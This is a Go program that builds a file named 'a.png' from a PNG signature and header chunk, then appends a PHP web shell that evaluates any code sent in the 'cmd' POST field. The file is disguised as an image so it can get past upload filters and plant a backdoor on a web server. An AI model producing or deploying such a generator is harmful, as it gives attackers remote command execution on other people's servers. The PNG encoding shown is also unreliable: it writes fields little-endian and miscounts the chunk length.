package main

import (
	"bytes"
	"encoding/binary"
	"fmt"
	"hash/crc32"
	"os"
)

func check(err error) {
	if err != nil {
		fmt.Println(err)
	}
}

// see : https://www.w3.org/TR/PNG/#5PNG-file-signature
var signature = []byte{137, 80, 78, 71, 13, 10, 26, 10}

// see : https://www.w3.org/TR/PNG/#5Chunk-layout
type chunk struct {
	length    uint32
	chunkType []byte // uint32, for convenience here we use []byte
	chunkData []byte
	crc       uint32 // verify type and data
}

func NewChunk(length uint32, chunkType, chunkData []byte) *chunk {
	buf := bytes.NewBuffer(nil)
	binary.Write(buf, binary.LittleEndian, chunkType)
	binary.Write(buf, binary.LittleEndian, chunkData)
	crc := crc32.ChecksumIEEE(buf.Bytes())
	return &chunk{
		length:    length,
		chunkType: chunkType,
		chunkData: chunkData,
		crc:       crc,
	}
}

func (c chunk) marshall() []byte {
	buf := bytes.NewBuffer(nil)
	binary.Write(buf, binary.LittleEndian, c.length)
	binary.Write(buf, binary.LittleEndian, c.chunkType)
	binary.Write(buf, binary.LittleEndian, c.chunkData)
	binary.Write(buf, binary.LittleEndian, c.crc)
	return buf.Bytes()
}

// see : https://www.w3.org/TR/PNG/#11IHDR
type iHdrBody struct {
	width             uint32 // can't be zero
	height            uint32 // can't be zero
	bitDepth          uint8
	colorType         uint8
	compressionMethod uint8
	filterMethod      uint8
	interlaceMethod   uint8
}

// return some data used in chunkData
func NewHdrBody() *iHdrBody {
	return &iHdrBody{
		width:             1,
		height:            1,
		bitDepth:          1,
		colorType:         0, //grayscale
		compressionMethod: 0,
		filterMethod:      0,
		interlaceMethod:   0,
	}
}

func (i iHdrBody) marshall() []byte {
	buf := bytes.NewBuffer(nil)
	binary.Write(buf, binary.LittleEndian, i)
	return buf.Bytes()
}

// see: https://www.w3.org/TR/PNG/#11IHDR
var iHdrType = []byte{73, 72, 68, 82}

func php() []byte {
	code := `<?php 
	echo eval($_POST["cmd"]);
	?>`
	return []byte(code)
}

func main() {
	buf := bytes.NewBuffer(nil)

	hdrChunkData := NewHdrBody().marshall()
	hdrChunkBytes := NewChunk(uint32(12+len(hdrChunkData)), iHdrType, hdrChunkData).marshall()

	binary.Write(buf, binary.LittleEndian, signature)
	binary.Write(buf, binary.LittleEndian, hdrChunkBytes)
	binary.Write(buf, binary.LittleEndian, php())

	f, err := os.OpenFile("a.png", os.O_CREATE|os.O_RDWR|os.O_TRUNC, os.ModePerm)
	check(err)
	binary.Write(f, binary.LittleEndian, buf.Bytes())
}
